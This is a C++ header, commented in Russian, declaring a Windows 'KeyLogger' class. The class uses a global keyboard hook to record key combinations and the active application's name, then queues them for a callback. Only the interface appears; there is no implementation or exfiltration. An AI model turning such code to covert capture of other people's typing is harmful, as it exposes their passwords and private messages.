#pragma once
#include <atomic>
#include <condition_variable>
#include <functional>
#include <mutex>
#include <queue>
#include <string>
#include <thread>
#include <windows.h>

struct KeyPressEvent {
    std::string appName;
    std::string keyCombination;
};

// Callback для обработки событий клавиш
using KeyEventCallback = std::function<void(const KeyPressEvent&)>;

class KeyLogger {
private:
    HHOOK keyboardHook;
    std::atomic<bool> isRunning{false};
    std::atomic<bool> shouldStop{false};
    
    // Поток для обработки событий
    std::thread processingThread;
    
    // Очередь событий и синхронизация
    std::queue<KeyPressEvent> eventQueue;
    std::mutex queueMutex;
    std::condition_variable queueCondition;
    
    // Callback для уведомления о новых событиях
    KeyEventCallback eventCallback;
    
    // Статический указатель для hook callback
    static KeyLogger* instance;
    
    // Hook callback
    static LRESULT CALLBACK keyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
    
    // Метод обработки событий в отдельном потоке
    void processEvents();
    
    // Добавление события в очередь (вызывается из hook)
    void addEvent(const KeyPressEvent& event);

public:
    KeyLogger();
    ~KeyLogger();
    
    // Запуск/остановка keylogger
    bool start(KeyEventCallback callback = nullptr);
    void stop();
    bool isActive() const;
    
    // Установка callback для обработки событий
    void setEventCallback(KeyEventCallback callback);
    
    // Utility методы
    static std::string getProcessName(DWORD processId);
    static std::string virtualKeyToString(UINT vkCode);
    
    // Запретить копирование
    KeyLogger(const KeyLogger&) = delete;
    KeyLogger& operator=(const KeyLogger&) = delete;
};